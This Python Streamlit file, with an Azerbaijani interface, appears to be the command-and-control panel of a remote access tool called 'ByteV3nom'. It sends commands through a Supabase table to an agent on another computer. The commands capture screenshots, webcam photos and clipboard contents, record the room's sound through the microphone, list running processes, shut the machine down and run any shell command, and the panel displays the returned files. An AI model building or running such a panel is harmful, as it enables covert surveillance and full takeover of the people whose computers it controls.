import os
import streamlit as st
from supabase import create_client, Client

URL = os.environ.get("SUPABASE_URL", "https://sfshteybktaruvawmmsb.supabase.co")
KEY = os.environ.get("SUPABASE_KEY")

st.set_page_config(page_title="ByteV3nom Control", layout="wide", page_icon="🐍")
st.title("🐍 ByteV3nom - Mobil İdarəetmə Mərkəzi")

if not KEY:
    st.error("⚠️ SUPABASE_KEY təyin edilməyib!")
    st.stop()

supabase: Client = create_client(URL, KEY)

def send_cmd(cmd):
    try:
        supabase.table("commands").insert({"command": cmd}).execute()
        st.toast(f"✅ Əmr göndərildi: {cmd}", icon="⚡")
    except Exception as e:
        st.error(f"Xəta: {e}")

# Sidebar - Sürətli İdarə
st.sidebar.title("🎮 Sürətli Əmrlər")
if st.sidebar.button("📸 Ekran Şəkli Al", use_container_width=True): send_cmd("screenshot")
if st.sidebar.button("📷 Kamera Şəkli Al", use_container_width=True): send_cmd("webcam")
if st.sidebar.button("🔒 Ekranı Kilidlə", use_container_width=True): send_cmd("lock")
if st.sidebar.button("🌙 Yuxu Rejimi", use_container_width=True): send_cmd("sleep")

st.sidebar.divider()
st.sidebar.subheader("🔊 Səs və Parlaqlıq")
vol = st.sidebar.slider("Səs (%)", 0, 100, 50)
if st.sidebar.button("Səsi Tənzimlə", use_container_width=True): send_cmd(f"volume {vol}")

bright = st.sidebar.slider("Parlaqlıq (%)", 0, 100, 80)
if st.sidebar.button("Parlaqlığı Tənzimlə", use_container_width=True): send_cmd(f"brightness {bright}")

# Tablar
tab1, tab2, tab3, tab4 = st.tabs(["🖥️ Sistem & Əmrlər", "🌐 Brauzer", "🎙️ Mikrofon", "⚡ Terminal / CMD"])

with tab1:
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("📊 Sistem Statusu", use_container_width=True): send_cmd("sysinfo")
        if st.button("🔋 Batareya Məlumatı", use_container_width=True): send_cmd("battery")
    with col2:
        if st.button("📝 İşləyən Proseslər", use_container_width=True): send_cmd("proc")
        if st.button("📋 Clipboard Oxu", use_container_width=True): send_cmd("clipget")
    with col3:
        if st.button("🛑 Kompüteri Söndür", use_container_width=True): send_cmd("shutdown")
        if st.button("🔄 Yenidən Başlat", use_container_width=True): send_cmd("restart")

with tab2:
    st.subheader("🌐 Brauzer Seçimi ilə Axtarış")
    b_type = st.selectbox("Brauzer Seç:", ["chrome", "msedge", "firefox", "brave", "default"])
    q_str = st.text_input("Axtarılacaq söz və ya URL:")
    if st.button("🔍 Axtar"): send_cmd(f"search {b_type} {q_str}")

with tab3:
    st.subheader("🎙️ Ətrafın Səsini Yazıb Telefona Göndər")
    rec_sec = st.number_input("Müddət (saniyə):", min_value=1, max_value=60, value=5)
    if st.button("🔴 Səs Yaz"): send_cmd(f"record {rec_sec}")

with tab4:
    st.subheader("💻 Terminal / CMD Əmri")
    cmd_in = st.text_input("İcra olunacaq komanda (məs: ipconfig):")
    if st.button("⚡ İcra Et"): send_cmd(f"run {cmd_in}")

st.divider()
st.subheader("📱 Kompüterdən Gələn Son Nəticələr")

try:
    res = supabase.table("commands").select("*").order("created_at", desc=True).limit(5).execute()
    for item in res.data:
        cmd_text = item.get("command")
        result_text = item.get("result", "Gözlənilir...")
        file_url = item.get("file_url")

        with st.expander(f"⚡ Əmr: {cmd_text}", expanded=True):
            st.write(f"**Nəticə:** {result_text}")
            if file_url:
                if file_url.endswith((".png", ".jpg", ".jpeg")):
                    st.image(file_url, caption="Gələn Şəkil", use_column_width=True)
                elif file_url.endswith((".wav", ".mp3")):
                    st.audio(file_url)
except Exception as e:
    st.error(f"Məlumat xətası: {e}")
